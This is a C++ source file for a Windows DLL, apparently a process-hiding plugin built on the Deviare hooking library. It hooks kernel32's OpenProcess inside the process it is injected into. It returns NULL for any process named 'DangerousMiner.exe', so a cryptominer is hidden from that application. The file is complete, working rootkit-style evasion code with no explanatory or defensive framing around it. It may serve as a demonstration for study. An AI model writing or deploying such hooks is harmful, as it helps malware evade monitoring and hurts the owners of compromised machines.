#include "pch.h"
#include "HookMngr.h"

typedef HANDLE(WINAPI* _OpenProcess)(
    IN DWORD dwDesiredAccess,
    IN BOOL  bInheritHandle,
    IN DWORD dwProcessId
    );

const _OpenProcess TrueOpenProcessFunction = reinterpret_cast<_OpenProcess>(
    GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "OpenProcess"));

static CNktHookLib cHookMgr;

static struct {
    SIZE_T nHookId;
    _OpenProcess trueOpenProcess;
} sOpenProcess_Hook = { 0, NULL };

HANDLE WINAPI OpenProcessHook(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
    HANDLE trueOpenProcess = TrueOpenProcessFunction(dwDesiredAccess, bInheritHandle, dwProcessId);
    if (trueOpenProcess != NULL)
    {
        // Hide the "DangerousMiner.exe" process from the application in which we injected.
        // Functionality returns NULL for the OpenProcess function, to not show the target process.
        const std::wstring processName = GetProcessNameFromPID(dwProcessId);
        if (processName == L"DangerousMiner.exe")
        {
            return NULL;
        }
    }

    return trueOpenProcess;
}

std::wstring GetProcessNameFromPID(const DWORD& pid) 
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) 
    {
        return L"";
    }

    PROCESSENTRY32 pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32FirstW(hSnapshot, &pe32)) 
    {
        CloseHandle(hSnapshot);
        return L"";
    }

    do 
    {
        if (pe32.th32ProcessID == pid) 
        {
            CloseHandle(hSnapshot);
            return pe32.szExeFile;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return L"";
}

extern "C" HRESULT WINAPI HookFunction()
{
    HINSTANCE kernel32DLL = NktHookLibHelpers::GetModuleBaseAddress(L"kernel32.dll");
    if (kernel32DLL == NULL)
    {
        OutputDebugStringW(L"ProcessHidePlugin_Deviare.dll:HookFunction - Error: Cannot get handle of kernel32.dll");
        return E_FAIL;
    }

    LPVOID fnOpenProcess = NktHookLibHelpers::GetProcedureAddress(kernel32DLL, "OpenProcess");
    if (fnOpenProcess == NULL)
    {
        OutputDebugStringW(L"ProcessHidePlugin_Deviare.dll:HookFunction - Error: Cannot get address of OpenProcess");
        return E_FAIL;
    }

    const HRESULT dwOsErr = static_cast<HRESULT>(cHookMgr.Hook(&(sOpenProcess_Hook.nHookId), (LPVOID*)&(sOpenProcess_Hook.trueOpenProcess),
        fnOpenProcess, OpenProcessHook, NKTHOOKLIB_DisallowReentrancy));
    return dwOsErr;
}

extern "C" HRESULT WINAPI UnhookFunction()
{
    const HRESULT dwOsErr = static_cast<HRESULT>(cHookMgr.Unhook(sOpenProcess_Hook.nHookId));
    return dwOsErr;
}
